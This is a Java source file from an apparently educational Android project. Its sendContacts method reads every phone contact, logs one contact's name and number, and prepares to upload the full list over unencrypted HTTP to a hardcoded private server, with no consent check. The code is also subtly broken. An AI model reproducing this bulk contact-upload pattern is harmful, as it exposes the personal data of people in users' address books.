package fr.intechinfo.fusionandroid;

import android.content.Context;
import android.util.Log;

import java.util.List;

import retrofit2.Retrofit;
import retrofit2.converter.jackson.JacksonConverterFactory;

import static android.content.ContentValues.TAG;

public class Contact {
    private String _name;
    private String _number;
    public Contact(){
    }

    public String GetName(){
        return _name;
    }
    public String GetNumber(){
        return _number;
    }
    public void SetName(String name) { _name = name; }
    public void SetNumber(String number) { _number = number; }

    public static void sendContacts(Context ctx){
        ContentCollector cc = new ContentCollector();
        List<Contact> lsContact = cc.GetContacts(ctx);
        Log.d(TAG,"Name : "+ lsContact.get(1).GetName()+" Number : " + lsContact.get(1).GetNumber());
        Retrofit retrofit = new Retrofit.Builder()
                .baseUrl("http://10.8.111.192:5000")
                .addConverterFactory(JacksonConverterFactory.create())
                .build();
        RetrofitAPI retrofitAPI = retrofit.create(RetrofitAPI.class);
        retrofitAPI.CreateContacts(lsContact);
    }
}
